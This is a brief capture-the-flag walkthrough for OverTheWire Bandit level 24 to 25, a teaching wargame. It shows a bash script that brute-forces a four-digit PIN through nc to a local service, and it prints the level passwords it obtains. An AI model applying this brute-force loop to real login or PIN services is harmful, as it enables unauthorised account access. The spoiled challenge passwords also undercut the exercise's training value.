# Bandit Level 24 -> Level 25:

In this level we need to brute force a pin in order to solve the challenge. If we send a pin to port 30002 we receive:

```sh
nc localhost 30002 <<< "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000"
I am the pincode checker for user bandit25. Please enter the password for use bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
```

We write a bash script to brute-force all combinations:

```bash
bandit24@bandit:~$ cat /tmp/exploit
#!/bin/bash

for i in {0000..9999}; do
  echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ${i}"
done | nc localhost 30002
```

Now we only need to run it and search for the correct output, by ignoring the "Wrong!" messages.

```sh
bandit24@bandit:~$ /tmp/exploit | grep -v "^Wrong!"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```
